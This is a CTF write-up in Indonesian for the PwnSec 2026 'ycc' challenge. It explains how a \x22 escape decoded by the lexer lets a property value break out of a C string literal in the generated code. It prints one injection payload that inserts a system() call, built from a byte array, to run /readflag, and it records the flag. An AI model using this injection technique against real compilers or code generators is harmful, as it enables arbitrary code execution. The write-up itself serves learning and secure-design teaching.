# ycc

> **Event:** PwnSec CTF 2026  
> **Kategori:** Misc  
> **Kesulitan:** Easy  
> **Status:** Solved

## 1. Gambaran Challenge

`ycc` adalah compiler untuk bahasa Y. Input dikompilasi menjadi kode C menggunakan `ycc --no-exec --no-io`. Target exploit berasal dari perbedaan antara escaping pada lexer dan escaping pada code generator.

## 2. Analisis Awal

Compiler menerima program Y, kemudian menghasilkan source C. Salah satu pola code generation yang relevan adalah akses property pada map:

```c
YValue *_v = y_map_get(_m, "<property>");
```

Masalahnya, property yang telah didekode oleh lexer dapat dimasukkan ke string C tanpa escaping yang memadai.

## 3. Bypass Lexer

Lexer Y mendukung bentuk escape `\x22`. Nilai tersebut didekode menjadi karakter quote `"`. Dengan demikian kita dapat memasukkan quote ke property tanpa menulis quote literal pada source yang diperiksa filter.

Hasilnya adalah kemungkinan menutup string C yang sedang dibangun oleh compiler.

## 4. Injection pada Generated C

Target exploit menggunakan property:

```text
x"); system((char[]){47,114,101,97,100,102,108,97,103,32,111,119,111,0}); y_map_get(_m,"x
```

Setelah lexer melakukan decoding, quote `"` menutup string C. Bagian berikutnya menyisipkan pemanggilan `system`. Byte array membentuk string NUL-terminated:

```text
/readflag owo
```

Byte pentingnya adalah:

```text
47 114 101 97 100 102 108 97 103 32 111 119 111 0
```

## 5. Mengapa `/readflag` Bisa Dipanggil?

Environment service membuat binary `/readflag` dengan setuid dan menghapus `FLAG` dari environment. Oleh karena itu membaca environment tidak diperlukan; exploit cukup menjalankan binary yang memang disediakan challenge.

Alur serangan:

```text
Y source
  ↓
lexer mendecode \x22
  ↓
property masuk ke code generator
  ↓
quote menutup string C
  ↓
`system(...)` masuk ke generated C
  ↓
compiler menghasilkan executable
  ↓
/readflag
  ↓
flag
```

## 6. Reproduksi

Exploit diarahkan agar property hasil decoding menjadi potongan source C. Solver resmi kemudian mengirim program Y ke compiler dan memperoleh output dari `/readflag`.

Perintah umum untuk menjalankan solver:

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

## 7. Hasil

Flag yang tercatat pada source:

```text
pwnsec{a8c305c05309d5eb}
```

## 8. Root Cause

Kerentanan terjadi karena **data yang berasal dari property diperlakukan sebagai bagian dari source code C**, sementara escaping dilakukan sebelum atau pada tahap yang tidak lagi menjaga boundary string C. Lexer yang mengubah `\x22` menjadi quote memperbesar perbedaan antara apa yang terlihat oleh filter dan apa yang akhirnya diterima code generator.

## 9. Pembelajaran

Compiler harus melakukan escaping berdasarkan konteks output terakhir. String untuk source C harus di-escape ketika dimasukkan ke literal C, bukan hanya mengandalkan representasi aman pada bahasa sumber. Perbedaan antara lexer, AST, dan code generator dapat menjadi injection boundary apabila data pengguna kembali menjadi source code.
